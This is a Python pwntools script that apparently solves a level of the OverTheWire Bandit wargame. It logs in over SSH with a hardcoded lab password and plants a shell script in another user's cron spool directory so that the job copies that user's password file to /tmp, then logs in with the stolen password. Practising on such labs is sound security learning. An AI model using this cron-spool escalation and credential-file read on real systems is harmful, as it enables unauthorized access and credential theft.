#!/bin/python2

import pwn
import re

user = "bandit23"
host = "bandit.labs.overthewire.org"
passwd = "jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n"
port = 2220

cmd = """  
echo 'cat /etc/bandit_pass/bandit24 > /tmp/pass_bandit24.txt' > /var/spool/bandit24/a.sh && 
chmod +x /var/spool/bandit24/a.sh && 
sleep 1m && 
cat /tmp/pass_bandit24.txt
"""

shell = pwn.ssh(user, host, port, passwd)
new_passwd = shell.run(cmd).recvline_regex(re.compile("[a-zA-Z0-9]{32}")).strip()

shell.close()

shell = pwn.ssh("bandit24", host, port, new_passwd)

print shell.ls()
